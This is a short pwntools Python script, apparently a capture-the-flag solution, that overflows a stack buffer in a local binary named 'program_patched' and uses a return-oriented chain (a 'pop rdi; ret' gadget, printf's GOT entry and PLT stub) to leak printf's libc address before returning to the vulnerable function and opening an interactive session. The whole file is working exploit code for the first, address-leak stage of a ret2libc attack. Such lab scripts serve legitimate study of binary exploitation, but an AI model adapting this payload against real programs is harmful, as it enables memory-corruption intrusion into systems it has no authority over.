from pwn import * 

# open the binary 
binary = "./program_patched"

p = process(binary)

elf = ELF(binary)
libc = ELF("./libc.so.6")
context.log_level = 'debug'

p.recvuntil(b"name???\n")

# Print available PLT entries
print("Available PLT functions:")
for func in elf.plt:
    print(f"- {func}")

# Print available GOT entries
print("\nAvailable GOT functions:")
for func in elf.got:
    print(f"- {func}")

payload = flat(
    b'A' * 0x10, # fill up the buffer up to rbp 
    b'B' * 8, # old rbp

    # leak libc base address 
    p64(0x0000000000400783), # pop rdi; ret 
    p64(elf.got['printf']),
    elf.plt['printf'],
    p64(0x0000000000400676) # return back to the same function again!
)
p.sendline(payload)

# Receive and parse the leak
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked printf address: {hex(leak)}")

p.interactive()